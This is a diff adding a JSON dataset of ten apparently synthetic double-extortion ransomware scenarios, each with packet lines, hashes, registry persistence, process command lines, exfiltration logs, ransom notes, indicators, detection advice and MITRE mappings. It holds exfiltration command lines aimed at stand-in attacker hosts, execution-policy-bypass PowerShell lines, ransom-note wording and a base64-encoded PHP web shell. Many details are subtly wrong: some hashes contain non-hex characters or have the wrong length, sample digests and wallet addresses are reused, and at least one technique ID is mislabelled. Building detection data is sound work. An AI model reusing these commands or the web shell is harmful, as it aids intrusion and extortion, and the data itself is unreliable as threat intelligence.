@@ -1,0 +1,541 @@
+{
+  "samples": [
+    {
+      "scenario": "Double-extortion ransomware attack using PowerShell scripts to exfiltrate data via HTTP POST requests before encrypting local files.",
+      "technical_data": {
+        "network_traffic": [
+          "Frame 2048: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits)",
+          "Ethernet II, Src: 00:15:5d:01:02:03, Dst: 93:18:f7:9c:3b:0a",
+          "Internet Protocol Version 4, Src: 10.0.0.15, Dst: 198.51.100.23",
+          "Transmission Control Protocol, Src Port: 49215, Dst Port: 443, Seq: 3456, Ack: 7890, Len: 512",
+          "TLSv1.2 Handshake Protocol: Client Hello",
+          "HTTP POST /upload HTTP/1.1",
+          "Host: data-exfiltration-server.com",
+          "Content-Type: application/octet-stream",
+          "Data (base64 encoded exfiltrated file chunk): U29tZV9leGZpbHRyYXRlZF9maWxlX2NoaW5rXzE="
+        ],
+        "file_hashes": {
+          "powershell_script": {
+            "md5": "d41d8cd98f00b204e9800998ecf8427e",
+            "sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+          },
+          "ransomware_executable": {
+            "md5": "acbd18db4cc2f85cedef654fccc4a4d8",
+            "sha256": "5d41402abc4b2a76b9719d911017c592"
+          }
+        },
+        "registry_changes": [
+          "Key: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "Value: SysSvcHost",
+          "Data: C:\\Windows\\SysNative\\svchost.exe -k netsvcs"
+        ],
+        "process_creation": [
+          "Timestamp: 2024-06-10T09:45:12Z",
+          "Process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "Parent Process: C:\\Windows\\Explorer.exe",
+          "Command Line: powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\exfiltrate.ps1"
+        ],
+        "exfiltration_logs": [
+          "2024-06-10 09:46:05 HTTP POST to data-exfiltration-server.com /upload file chunk 1/15 size 2MB",
+          "2024-06-10 09:46:10 HTTP POST to data-exfiltration-server.com /upload file chunk 2/15 size 2MB"
+        ],
+        "ransom_note_sample": "All your important files have been encrypted and copied. To prevent public data release, send 75 BTC to wallet 3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5."
+      },
+      "indicators": [
+        "Unusual PowerShell execution with network connections to external IP on port 443",
+        "HTTP POST requests carrying base64 encoded data to suspicious domain",
+        "Registry autorun entry for svchost.exe in non-standard Run key",
+        "Process chain showing PowerShell invoked by Explorer.exe executing unknown script",
+        "Ransom note demanding Bitcoin payment with threat of data leak"
+      ],
+      "detection_method": "Monitor PowerShell activity for scripts invoking network communications, inspect HTTP POST payloads for encoded data, alert on new autorun registry entries especially involving svchost.exe, analyze process lineage for unusual parent-child relationships, and scan file shares for ransom note signatures.",
+      "relevant_mitre_techniques": [
+        "T1486 - Data Encrypted for Impact",
+        "T1041 - Exfiltration Over C2 Channel (HTTP)",
+        "T1059.001 - PowerShell",
+        "T1547.001 - Registry Run Keys / Startup Folder",
+        "T1071.001 - Application Layer Protocol: Web Protocols"
+      ]
+    },
+    {
+      "scenario": "Double-extortion ransomware attack leveraging compromised RDP access to move laterally, exfiltrate data via FTP, and encrypt endpoint files.",
+      "technical_data": {
+        "network_traffic": [
+          "Frame 3500: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits)",
+          "Ethernet II, Src: 00:50:56:aa:bb:cc, Dst: 00:0c:29:dd:ee:ff",
+          "Internet Protocol Version 4, Src: 172.16.5.10, Dst: 10.10.10.25",
+          "Transmission Control Protocol, Src Port: 3389, Dst Port: 56789, Seq: 1234, Ack: 4321, Len: 1024",
+          "RDP Protocol: Client MCS Connect Initial PDU",
+          "FTP Command: STOR confidential_backup.zip",
+          "FTP Data Transfer: 5MB binary data chunk"
+        ],
+        "file_hashes": {
+          "ransomware_binary": {
+            "md5": "9e107d9d372bb6826bd81d3542a419d6",
+            "sha1": "2fd4e1c67a2d28fced849ee1bb76e7391b93eb12",
+            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+          }
+        },
+        "registry_changes": [
+          "Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "Value: WindowsUpdate",
+          "Data: C:\\Users\\Public\\winupdate.exe"
+        ],
+        "process_creation": [
+          "Timestamp: 2024-06-11T14:20:33Z",
+          "Process: C:\\Users\\Public\\winupdate.exe",
+          "Parent Process: C:\\Windows\\System32\\svchost.exe",
+          "Command Line: winupdate.exe -encrypt -ftp-upload 10.10.10.15"
+        ],
+        "exfiltration_logs": [
+          "2024-06-11 14:21:12 FTP STOR to 10.10.10.15: confidential_backup.zip size 50MB chunk 1/20",
+          "2024-06-11 14:21:20 FTP STOR to 10.10.10.15: confidential_backup.zip size 50MB chunk 2/20"
+        ],
+        "ransom_note_sample": "Your data has been encrypted and stolen. To get the decryption key and prevent leakage, send 100 BTC to 3Pq2qf5YQbF7xJ9HkWmZL8vRcN2x7Y1T9P."
+      },
+      "indicators": [
+        "Unusual RDP sessions from uncommon internal IPs",
+        "FTP data uploads to external IP addresses",
+        "Presence of suspicious executable 'winupdate.exe' in Public folder with autorun registry",
+        "Process spawn chain showing winupdate.exe launched by svchost.exe",
+        "Ransom note files dropped in multiple directories"
+      ],
+      "detection_method": "Monitor RDP sessions for unauthorized access and lateral movement, inspect FTP sessions for large outbound file transfers, detect new autorun registry entries in user context, correlate file hashes with threat intelligence, and scan endpoint drives for ransom notes.",
+      "relevant_mitre_techniques": [
+        "T1021.001 - Remote Services: Remote Desktop Protocol",
+        "T1041 - Exfiltration Over C2 Channel (FTP)",
+        "T1486 - Data Encrypted for Impact",
+        "T1547.001 - Registry Run Keys / Startup Folder",
+        "T1059 - Command and Scripting Interpreter"
+      ]
+    },
+    {
+      "scenario": "Double-extortion ransomware deploying via malicious macro in Excel document, exfiltrating via DNS tunneling before encrypting user files.",
+      "technical_data": {
+        "network_traffic": [
+          "Frame 4500: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits)",
+          "Ethernet II, Src: 00:0a:95:9d:68:16, Dst: 00:0c:29:ab:cd:ef",
+          "Internet Protocol Version 4, Src: 192.168.0.102, Dst: 203.0.113.5",
+          "User Datagram Protocol, Src Port: 5353, Dst Port: 53, Len: 128",
+          "DNS Query for exfiltrated_data.attackerdomain.com",
+          "Data encoded in DNS TXT record queries: Y29uZmlkZW50aWFsX2RhdGE="
+        ],
+        "file_hashes": {
+          "malicious_excel_macro": {
+            "md5": "1a79a4d60de6718e8e5b326e338ae533",
+            "sha1": "5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8",
+            "sha256": "2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3"
+          },
+          "ransomware_payload": {
+            "md5": "c4ca4238a0b923820dcc509a6f75849b",
+            "sha256": "3c6e0b8a9c15224a8228b9a98ca1531d3e8f5f16f45e6f3a9f5d7b8a3cabc123"
+          }
+        },
+        "registry_changes": [
+          "Key: HKCU\\Software\\Microsoft\\Office\\Excel\\Security",
+          "Value: VBAWarnings",
+          "Data: 1 (disable warnings)"
+        ],
+        "process_creation": [
+          "Timestamp: 2024-06-12T08:10:55Z",
+          "Process: C:\\Users\\User\\Documents\\invoice.xlsm",
+          "Parent Process: C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+          "Command Line: EXCEL.EXE /automation"
+        ],
+        "exfiltration_logs": [
+          "2024-06-12 08:11:30 DNS Query to attackerdomain.com TXT record containing encoded data chunk 1/12",
+          "2024-06-12 08:11:32 DNS Query to attackerdomain.com TXT record containing encoded data chunk 2/12"
+        ],
+        "ransom_note_sample": "All sensitive files encrypted and copied. To avoid public disclosure, pay 60 BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa."
+      },
+      "indicators": [
+        "Excel files containing macros with disabled VBA warnings",
+        "DNS queries with unusual TXT record requests encoding data",
+        "Process creation showing Excel automation running suspicious document",
+        "File hashes matching known macro malware and ransomware samples",
+        "Ransom note files appearing on user desktop and Documents folder"
+      ],
+      "detection_method": "Monitor and block suspicious macro execution in Office documents, analyze DNS traffic for unusual TXT record queries indicative of tunneling, correlate malware hashes with threat intel, detect registry modifications disabling macro warnings, and inspect file shares for ransom notes.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Spearphishing Attachment",
+        "T1041 - Exfiltration Over C2 Channel (DNS)",
+        "T1486 - Data Encrypted for Impact",
+        "T1113 - Screen Capture (if used for data collection)",
+        "T1564.001 - Hidden Files and Directories"
+      ]
+    },
+    {
+      "scenario": "Double-extortion ransomware attack exploiting a vulnerable web server to upload web shell, exfiltrate database dumps over HTTP, and encrypt backend files.",
+      "technical_data": {
+        "network_traffic": [
+          "Frame 6000: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits)",
+          "Ethernet II, Src: 00:25:90:12:34:56, Dst: 00:50:56:78:9a:bc",
+          "Internet Protocol Version 4, Src: 203.0.113.7, Dst: 192.168.5.20",
+          "Transmission Control Protocol, Src Port: 443, Dst Port: 54321, Seq: 8765, Ack: 4321, Len: 2048",
+          "HTTP POST /upload_shell.php HTTP/1.1",
+          "Host: victim-webserver.com",
+          "Content-Type: multipart/form-data",
+          "Data (base64 encoded web shell): PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4="
+        ],
+        "file_hashes": {
+          "web_shell": {
+            "md5": "098f6bcd4621d373cade4e832627b4f6",
+            "sha1": "ad0234829205b9033196ba818f7a872b",
+            "sha256": "2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3"
+          },
+          "ransomware_binary": {
+            "md5": "8f14e45fceea167a5a36dedd4bea2543",
+            "sha1": "6512bd43d9caa6e02c990b0a82652dca",
+            "sha256": "e1671797c52e15f763380b45e841ec32"
+          }
+        },
+        "registry_changes": [
+          "Key: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+          "Value: WebUpdate",
+          "Data: C:\\inetpub\\wwwroot\\webupdate.exe"
+        ],
+        "process_creation": [
+          "Timestamp: 2024-06-14T17:05:45Z",
+          "Process: C:\\inetpub\\wwwroot\\webupdate.exe",
+          "Parent Process: C:\\Windows\\System32\\svchost.exe",
+          "Command Line: webupdate.exe -encrypt -dbdump HTTP://exfilserver.com/upload"
+        ],
+        "exfiltration_logs": [
+          "2024-06-14 17:06:12 HTTP POST to exfilserver.com/upload database_dump.sql.gz size 120MB chunk 1/30",
+          "2024-06-14 17:06:20 HTTP POST to exfilserver.com/upload database_dump.sql.gz size 120MB chunk 2/30"
+        ],
+        "ransom_note_sample": "Your server files and databases have been encrypted and stolen. To decrypt and prevent leak, pay 120 BTC to 1BoatSLRHtKNngkdXEeobR76b53LETtpyT."
+      },
+      "indicators": [
+        "HTTP POST requests uploading PHP web shell to public web directory",
+        "Exfiltration of large database dump files over HTTP POST",
+        "New autorun entry under RunOnce registry key for webupdate.exe",
+        "Process creation chain involving webupdate.exe launched by svchost.exe",
+        "Ransom notes deployed to webroot and backup directories"
+      ],
+      "detection_method": "Monitor web server logs for suspicious file uploads including web shells, inspect HTTP POST traffic for large outbound data transfers, alert on new RunOnce registry entries, correlate suspicious file hashes, and scan webroot folders for ransom notes.",
+      "relevant_mitre_techniques": [
+        "T1190 - Exploit Public-Facing Application",
+        "T1505.003 - Server Software Component: Web Shell",
+        "T1041 - Exfiltration Over C2 Channel (HTTP)",
+        "T1486 - Data Encrypted for Impact",
+        "T1547.001 - Registry Run Keys / Startup Folder"
+      ]
+    },
+    {
+      "scenario": "Double-extortion ransomware attack delivered via compromised software update server, exfiltrating configuration files over FTP and encrypting critical application files.",
+      "technical_data": {
+        "network_traffic": [
+          "Frame 7200: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits)",
+          "Ethernet II, Src: 00:1a:2b:3c:4d:5e, Dst: 00:0c:29:6e:7f:80",
+          "Internet Protocol Version 4, Src: 10.1.1.5, Dst: 198.51.100.55",
+          "Transmission Control Protocol, Src Port: 21, Dst Port: 53210, Seq: 4321, Ack: 1234, Len: 4096",
+          "FTP Command: STOR app_config_backup.tar.gz",
+          "FTP Data Transfer: 10MB binary chunk"
+        ],
+        "file_hashes": {
+          "malicious_updater": {
+            "md5": "827ccb0eea8a706c4c34a16891f84e7b",
+            "sha1": "b326b5062b2f0e69046810717534cb09",
+            "sha256": "5d41402abc4b2a76b9719d911017c592"
+          }
+        },
+        "registry_changes": [
+          "Key: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "Value: AppUpdate",
+          "Data: C:\\ProgramData\\appupdater.exe"
+        ],
+        "process_creation": [
+          "Timestamp: 2024-06-15T11:50:13Z",
+          "Process: C:\\ProgramData\\appupdater.exe",
+          "Parent Process: C:\\Windows\\System32\\services.exe",
+          "Command Line: appupdater.exe -encrypt -ftp-upload 198.51.100.55"
+        ],
+        "exfiltration_logs": [
+          "2024-06-15 11:51:00 FTP STOR to 198.51.100.55 app_config_backup.tar.gz size 100MB chunk 1/25",
+          "2024-06-15 11:51:12 FTP STOR to 198.51.100.55 app_config_backup.tar.gz size 100MB chunk 2/25"
+        ],
+        "ransom_note_sample": "Critical application files encrypted and exfiltrated. Send 85 BTC to 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy to retrieve your data and decrypt files."
+      },
+      "indicators": [
+        "Unexpected software update process communicating over FTP to external IP",
+        "New autorun registry entry for suspicious appupdater.exe",
+        "Process spawned by services.exe with unknown command line",
+        "Large FTP file transfer sessions to external IP",
+        "Ransom notes found on application directory and user desktops"
+      ],
+      "detection_method": "Monitor software update processes for unusual network activity, inspect FTP traffic for outbound data dumps, alert on new autorun registry entries especially in system-wide Run keys, analyze process creation events for anomalies, and scan file system for ransom notes.",
+      "relevant_mitre_techniques": [
+        "T1543.003 - Windows Service",
+        "T1041 - Exfiltration Over C2 Channel (FTP)",
+        "T1486 - Data Encrypted for Impact",
+        "T1547.001 - Registry Run Keys / Startup Folder",
+        "T1071.001 - Application Layer Protocol: Web Protocols"
+      ]
+    },
+    {
+      "scenario": "Double-extortion ransomware attack exploiting RDP brute force to gain initial access, followed by data encryption and exfiltration over FTP.",
+      "technical_data": {
+        "network_traffic": [
+          "Frame 2048: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits)",
+          "Ethernet II, Src: 00:0a:95:9d:68:16, Dst: 00:15:5d:01:02:03",
+          "Internet Protocol Version 4, Src: 203.0.113.55, Dst: 192.168.10.20",
+          "Transmission Control Protocol, Src Port: 3389, Dst Port: 53821, Seq: 1001, Ack: 1001, Len: 512",
+          "RDP Negotiation Request",
+          "FTP Command: STOR sensitive_finance_data.zip",
+          "FTP Data Transfer: 3.2MB file uploaded in 5 chunks"
+        ],
+        "file_hashes": {
+          "payload_executable": {
+            "md5": "e8d3f4a7b2c9d1f4a5b6c7d8e9f01234",
+            "sha1": "b1a2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8g9h0",
+            "sha256": "9f8e7d6c5b4a3928172635445566778899aabbccddeeff001122334455667788"
+          }
+        },
+        "registry_changes": [
+          "Key: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "Value: WinUpdateService",
+          "Data: C:\\Windows\\System32\\winupdatesvc.exe"
+        ],
+        "process_creation": [
+          "Timestamp: 2024-06-01T08:15:32Z",
+          "Process: C:\\Windows\\System32\\winupdatesvc.exe",
+          "Parent Process: C:\\Windows\\System32\\services.exe",
+          "Command Line: winupdatesvc.exe -exfiltrate -target ftp://203.0.113.100/uploads/"
+        ],
+        "exfiltration_logs": [
+          "2024-06-01 08:16:00 FTP Upload to 203.0.113.100: sensitive_finance_data.zip part 1/5",
+          "2024-06-01 08:16:10 FTP Upload to 203.0.113.100: sensitive_finance_data.zip part 2/5"
+        ],
+        "ransom_note_sample": "Your data has been encrypted and copied. Transfer 75 BTC to wallet 3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5 within 72 hours or your sensitive data will be leaked."
+      },
+      "indicators": [
+        "Unusual RDP login attempts from external IP 203.0.113.55",
+        "Outbound FTP connections to uncommon external IP 203.0.113.100",
+        "Persistence via suspicious service 'winupdatesvc.exe' with autorun registry",
+        "File hashes matching known ransomware payload",
+        "Presence of ransom note demanding large BTC payment with deadline"
+      ],
+      "detection_method": "Monitor RDP authentication logs for brute force patterns, alert on FTP connections to unapproved external hosts, detect new service registrations with suspicious executables, correlate file hashes with threat intelligence feeds, and scan for ransom note files in user directories.",
+      "relevant_mitre_techniques": [
+        "T1078 - Valid Accounts",
+        "T1021.001 - Remote Services: Remote Desktop Protocol",
+        "T1041 - Exfiltration Over C2 Channel (FTP)",
+        "T1486 - Data Encrypted for Impact",
+        "T1053 - Scheduled Task/Job (for persistence)",
+        "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+      ]
+    },
+    {
+      "scenario": "Double-extortion ransomware attack utilizing malicious PowerShell script to encrypt files and exfiltrate data over HTTPS using a custom C2 server.",
+      "technical_data": {
+        "network_traffic": [
+          "Frame 512: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits)",
+          "Ethernet II, Src: 00:0c:29:4f:8e:12, Dst: 00:50:56:c0:00:09",
+          "Internet Protocol Version 4, Src: 192.168.5.10, Dst: 198.51.100.10",
+          "Transmission Control Protocol, Src Port: 52345, Dst Port: 443, Seq: 2001, Ack: 2001, Len: 1024",
+          "TLSv1.2 Handshake",
+          "HTTP POST /upload HTTP/1.1",
+          "Host: data-secure.example.com",
+          "Content-Type: application/octet-stream",
+          "Encrypted file chunk size: 1MB"
+        ],
+        "file_hashes": {
+          "powershell_script": {
+            "md5": "ab12cd34ef56gh78ij90klmn1234op56",
+            "sha1": "1a2b3c4d5e6f7890abcdef1234567890abcdef12",
+            "sha256": "abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890"
+          }
+        },
+        "registry_changes": [
+          "Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "Value: PSUpdate",
+          "Data: powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\User\\Documents\\psupdate.ps1"
+        ],
+        "process_creation": [
+          "Timestamp: 2024-06-10T14:07:23Z",
+          "Process: powershell.exe",
+          "Parent Process: explorer.exe",
+          "Command Line: powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\User\\Documents\\psupdate.ps1 -encrypt -exfiltrate"
+        ],
+        "exfiltration_logs": [
+          "2024-06-10 14:08:00 HTTPS POST to data-secure.example.com/upload chunk 1/15",
+          "2024-06-10 14:08:10 HTTPS POST to data-secure.example.com/upload chunk 2/15"
+        ],
+        "ransom_note_sample": "All your files are encrypted and exfiltrated. Send 30 BTC to address bc1qw4jh8xv2d2y4q8p9z0l3m5n6r7s8t9u0v1w2x3y4z5a6b7c8d9e0f1g2h3i4 to recover your data."
+      },
+      "indicators": [
+        "PowerShell execution with bypass policy and suspicious script",
+        "Outbound HTTPS connections to unknown C2 domain data-secure.example.com",
+        "Autorun registry entry for PowerShell script in user context",
+        "File hashes of PowerShell script matching ransomware activity",
+        "Ransom note with cryptocurrency wallet address"
+      ],
+      "detection_method": "Monitor PowerShell command line arguments for suspicious execution policies, inspect outbound HTTPS traffic to rare domains, detect new autorun registry entries pointing to scripts, analyze script hashes against known threat databases, and scan file shares for ransom notes.",
+      "relevant_mitre_techniques": [
+        "T1059.001 - Command and Scripting Interpreter: PowerShell",
+        "T1041 - Exfiltration Over C2 Channel (HTTPS)",
+        "T1486 - Data Encrypted for Impact",
+        "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+        "T1071.001 - Application Layer Protocol: Web Protocols"
+      ]
+    },
+    {
+      "scenario": "Double-extortion ransomware deployed via compromised VPN credentials, encrypting database backups and exfiltrating them via SFTP to attacker-controlled server.",
+      "technical_data": {
+        "network_traffic": [
+          "Frame 678: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits)",
+          "Ethernet II, Src: 00:1a:2b:3c:4d:5e, Dst: 00:1b:63:84:45:e6",
+          "Internet Protocol Version 4, Src: 198.51.100.75, Dst: 10.0.0.15",
+          "Transmission Control Protocol, Src Port: 443, Dst Port: 51820, Seq: 5001, Ack: 5001, Len: 128",
+          "VPN Authentication Success",
+          "SFTP Session Initiated to 198.51.100.75 port 22",
+          "SFTP Upload: backup_database_20240612.zip size 6.5GB"
+        ],
+        "file_hashes": {
+          "ransomware_binary": {
+            "md5": "12ab34cd56ef78gh90ij12kl34mn56op",
+            "sha1": "abcdef1234567890abcdef1234567890abcdef12",
+            "sha256": "123456abcdef7890abcdef1234567890abcdef1234567890abcdef1234567890"
+          }
+        },
+        "registry_changes": [
+          "Key: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "Value: DbServiceUpdate",
+          "Data: C:\\ProgramData\\dbserviceupdate.exe"
+        ],
+        "process_creation": [
+          "Timestamp: 2024-06-12T02:45:12Z",
+          "Process: C:\\ProgramData\\dbserviceupdate.exe",
+          "Parent Process: C:\\Windows\\System32\\svchost.exe",
+          "Command Line: dbserviceupdate.exe -encrypt -exfiltrate sftp://198.51.100.75/backups/"
+        ],
+        "exfiltration_logs": [
+          "2024-06-12 02:46:00 SFTP Upload to 198.51.100.75: backup_database_20240612.zip chunk 1/20",
+          "2024-06-12 02:46:30 SFTP Upload to 198.51.100.75: backup_database_20240612.zip chunk 2/20"
+        ],
+        "ransom_note_sample": "Your backups have been encrypted and exfiltrated. Pay 60 BTC to 1N2o3p4q5r6s7t8u9v0wxyzABCD123456 to prevent public release."
+      },
+      "indicators": [
+        "VPN logins from unusual external IP 198.51.100.75 using valid credentials",
+        "Outbound SFTP sessions to unknown external IP 198.51.100.75",
+        "New autorun executable 'dbserviceupdate.exe' in ProgramData",
+        "File hashes matching known ransomware samples",
+        "Ransom notes found in backup directories"
+      ],
+      "detection_method": "Correlate VPN logins with known user activity, alert on SFTP connections to suspicious external IPs, monitor autorun registry keys for new entries, verify executable hashes against threat intelligence, and scan backup directories for ransom notes.",
+      "relevant_mitre_techniques": [
+        "T1078 - Valid Accounts",
+        "T1021.004 - Remote Services: VPN",
+        "T1041 - Exfiltration Over C2 Channel (SFTP)",
+        "T1486 - Data Encrypted for Impact",
+        "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+      ]
+    },
+    {
+      "scenario": "Double-extortion ransomware delivered via malicious macro in Excel document, encrypting files and exfiltrating data over DNS tunneling.",
+      "technical_data": {
+        "network_traffic": [
+          "Frame 310: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits)",
+          "Ethernet II, Src: 00:0d:93:7f:6e:22, Dst: 00:0f:66:77:88:99",
+          "Internet Protocol Version 4, Src: 192.168.2.50, Dst: 8.8.8.8",
+          "User Datagram Protocol, Src Port: 5353, Dst Port: 53, Length: 512",
+          "DNS Query Type TXT: exfiltrated_data_chunk1",
+          "DNS Query Type TXT: exfiltrated_data_chunk2"
+        ],
+        "file_hashes": {
+          "malicious_excel_macro": {
+            "md5": "7890abcd1234ef567890abcd1234ef56",
+            "sha1": "1234567890abcdef1234567890abcdef12345678",
+            "sha256": "abcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcd"
+          }
+        },
+        "registry_changes": [
+          "Key: HKCU\\Software\\Microsoft\\Office\\Excel\\Security",
+          "Value: VBAWarnings",
+          "Data: 1 (enable macros)"
+        ],
+        "process_creation": [
+          "Timestamp: 2024-06-15T11:20:00Z",
+          "Process: C:\\Users\\User\\Documents\\finance_report.xlsm",
+          "Parent Process: EXCEL.EXE",
+          "Command Line: excel.exe /e C:\\Users\\User\\Documents\\finance_report.xlsm"
+        ],
+        "exfiltration_logs": [
+          "2024-06-15 11:21:30 DNS TXT query to attacker-controlled domain exfilchunk1.attacker-dns.net",
+          "2024-06-15 11:21:35 DNS TXT query to attacker-controlled domain exfilchunk2.attacker-dns.net"
+        ],
+        "ransom_note_sample": "Files encrypted and copied outside your network. Transfer 25 BTC to 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy within 48 hours or data will be publicly released."
+      },
+      "indicators": [
+        "Execution of Excel macro-enabled document from untrusted source",
+        "DNS TXT queries with unusual high volume and length to suspicious domains",
+        "Registry modification enabling macros",
+        "File hashes matching known macro-based ransomware",
+        "Ransom note presence on user desktops and shared folders"
+      ],
+      "detection_method": "Monitor Office macro execution and related registry keys, analyze DNS traffic for high volume TXT record queries to unknown domains, scan documents for malicious macros, correlate file hashes with threat intelligence, and inspect endpoints for ransom note creation.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1041 - Exfiltration Over C2 Channel (DNS)",
+        "T1486 - Data Encrypted for Impact",
+        "T1566 - Phishing"
+      ]
+    },
+    {
+      "scenario": "Double-extortion ransomware propagated through compromised software supply chain, encrypting data and exfiltrating it via cloud storage API calls.",
+      "technical_data": {
+        "network_traffic": [
+          "Frame 789: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits)",
+          "Ethernet II, Src: 00:0c:29:a1:b2:c3, Dst: 00:50:56:c0:00:0a",
+          "Internet Protocol Version 4, Src: 192.168.50.12, Dst: 52.94.123.100",
+          "Transmission Control Protocol, Src Port: 49876, Dst Port: 443, Seq: 4001, Ack: 4001, Len: 2048",
+          "TLSv1.3 Handshake",
+          "HTTPS POST /api/v1/upload HTTP/1.1",
+          "Host: cloudstorage.exampleapi.com",
+          "Content-Type: application/json",
+          "Payload: Encrypted data chunks"
+        ],
+        "file_hashes": {
+          "compromised_installer": {
+            "md5": "abcdef1234567890abcdef1234567890",
+            "sha1": "1234567890abcdef1234567890abcdef12345678",
+            "sha256": "7890abcdef1234567890abcdef1234567890abcdef1234567890abcdef123456"
+          }
+        },
+        "registry_changes": [
+          "Key: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "Value: UpdateService",
+          "Data: C:\\Program Files\\Common Files\\updateservice.exe"
+        ],
+        "process_creation": [
+          "Timestamp: 2024-06-20T16:40:00Z",
+          "Process: C:\\Program Files\\Common Files\\updateservice.exe",
+          "Parent Process: C:\\Windows\\explorer.exe",
+          "Command Line: updateservice.exe --encrypt --exfiltrate --cloud-api-key ABCDEFG1234567890"
+        ],
+        "exfiltration_logs": [
+          "2024-06-20 16:41:00 HTTPS POST to cloudstorage.exampleapi.com/api/v1/upload chunk 1/25",
+          "2024-06-20 16:41:30 HTTPS POST to cloudstorage.exampleapi.com/api/v1/upload chunk 2/25"
+        ],
+        "ransom_note_sample": "Your data is encrypted and copied to our cloud. Send 100 BTC to bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh to recover your files safely."
+      },
+      "indicators": [
+        "Installation of compromised software update with known malicious hash",
+        "Suspicious cloud API calls to unapproved external domain cloudstorage.exampleapi.com",
+        "New autorun executable 'updateservice.exe' in Program Files common directory",
+        "Ransom note files found in multiple critical directories",
+        "Unusual HTTPS traffic with large payloads from internal hosts"
+      ],
+      "detection_method": "Validate software updates against trusted sources and hashes, monitor API calls to cloud services for anomalies, detect new autorun entries in critical system folders, analyze network traffic for large encrypted data uploads, and scan endpoints for ransom notes.",
+      "relevant_mitre_techniques": [
+        "T1195 - Supply Chain Compromise",
+        "T1486 - Data Encrypted for Impact",
+        "T1041 - Exfiltration Over C2 Channel (HTTPS)",
+        "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+      ]
+    }
+  ]
+}
